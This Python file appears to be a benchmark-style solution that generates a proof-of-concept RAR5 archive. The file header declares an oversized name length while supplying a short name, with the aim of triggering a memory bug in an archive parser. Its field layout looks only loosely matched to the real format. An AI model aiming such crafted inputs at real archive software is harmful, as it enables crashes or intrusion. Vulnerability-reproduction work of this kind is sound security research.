import struct
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # RAR5 signature (8 bytes)
        rar5_sig = b'Rar!\x1a\x07\x01\x00'
        
        # Create a file header (type=2) with excessive name size
        # Header structure:
        # - CRC32 (4 bytes) - we'll compute later
        # - Header size (variable length)
        # - Header type (1 byte = 0x02 for file header)
        # - Header flags (variable length)
        # - Other fields...
        # - Name size (variable length)
        # - Name data
        
        # We'll build the header without CRC first
        header_parts = []
        
        # Header type = file header (0x02)
        header_parts.append(b'\x02')
        
        # Header flags: 
        # - Bit 0: has_extra_time (0)
        # - Bit 1: has_extra_flags (0)
        # - Bit 2: has_extra_high_pack_size (0)
        # - Bit 3: has_data (1 - has file data)
        # - Bit 4: has_unknown (0)
        # - Bit 5: has_extra_high_unp_size (0)
        # - Bit 6: has_version (0)
        # - Bit 7: has_crc (1 - has file CRC)
        flags = 0
        flags |= 1 << 3  # has_data
        flags |= 1 << 7  # has_crc
        header_parts.append(struct.pack('<B', flags))
        
        # File attributes (0)
        header_parts.append(b'\x00')
        
        # Modification time (0)
        header_parts.append(struct.pack('<I', 0))
        
        # Compression info:
        # - Method: 0 (store)
        # - Flags: 0
        compression_info = 0
        header_parts.append(struct.pack('<H', compression_info))
        
        # OS type (0 = Windows)
        header_parts.append(b'\x00')
        
        # Name size - this is the critical part
        # We use an excessive size that will trigger the vulnerability
        # Encode 0x1000001 using variable-length encoding
        # This is > 0x1000000 which is likely the maximum allowed
        name_size = 0x1000001  # 16,777,217 bytes
        
        # Variable-length encoding for name_size
        name_size_bytes = bytearray()
        while name_size > 0:
            byte = name_size & 0x7F
            name_size >>= 7
            if name_size > 0:
                byte |= 0x80
            name_size_bytes.append(byte)
        
        header_parts.append(bytes(name_size_bytes))
        
        # Name data - we only provide a small name, but the allocation
        # will be for the huge size from name_size
        name = b"vulnerable.txt"
        header_parts.append(name)
        
        # Pack size (file data size) - 0
        # Unpack size - 0
        # File CRC32 - 0
        # These are included because has_data and has_crc flags are set
        header_parts.append(struct.pack('<Q', 0))  # Pack size
        header_parts.append(struct.pack('<Q', 0))  # Unpack size
        header_parts.append(struct.pack('<I', 0))  # File CRC32
        
        # Now we need to calculate the header size
        header_body = b''.join(header_parts)
        
        # Variable-length encoding for header size
        header_size = len(header_body)
        header_size_bytes = bytearray()
        temp_size = header_size
        while temp_size > 0:
            byte = temp_size & 0x7F
            temp_size >>= 7
            if temp_size > 0:
                byte |= 0x80
            header_size_bytes.append(byte)
        
        # Build the complete header with size
        complete_header = bytes(header_size_bytes) + header_body
        
        # Calculate CRC32 of the complete header (without the CRC field itself)
        # Using a simple CRC32 implementation
        def crc32(data):
            crc = 0xFFFFFFFF
            for byte in data:
                crc ^= byte
                for _ in range(8):
                    if crc & 1:
                        crc = (crc >> 1) ^ 0xEDB88320
                    else:
                        crc >>= 1
            return crc ^ 0xFFFFFFFF
        
        header_crc = crc32(complete_header)
        
        # Build final archive
        poc = rar5_sig
        poc += struct.pack('<I', header_crc)
        poc += complete_header
        
        return poc